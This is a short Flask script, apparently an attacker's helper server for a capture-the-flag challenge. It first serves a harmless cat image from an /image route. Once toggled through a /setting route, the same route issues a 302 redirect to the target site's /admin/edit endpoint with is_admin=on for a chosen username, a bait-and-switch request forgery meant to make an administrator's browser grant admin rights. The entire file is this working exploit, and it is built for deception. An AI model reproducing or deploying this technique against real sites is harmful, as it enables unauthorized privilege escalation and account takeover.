from flask import Flask, send_from_directory, redirect, request

app = Flask(__name__)

USER = "anvar"
FLAG = True
SITE_URL = "https://tctf-notizen.ctf.su"


@app.route("/image")
def fake_image():
    global SITE_URL, USER, FLAG

    if FLAG:
        filename = "cat.jpeg"
        return send_from_directory('static', filename)
    
    link = f"{SITE_URL}/admin/edit?username={USER}&is_admin=on"
    
    print("redirect to ", link)
    
    return redirect(link, 302)


@app.route("/setting")
def setting():
    global USER, FLAG

    username = request.values.get("username")

    USER = username if username else USER
    FLAG = True if request.values.get("flag") == 'on' else False

    return f"username={USER}, flag={FLAG}"
    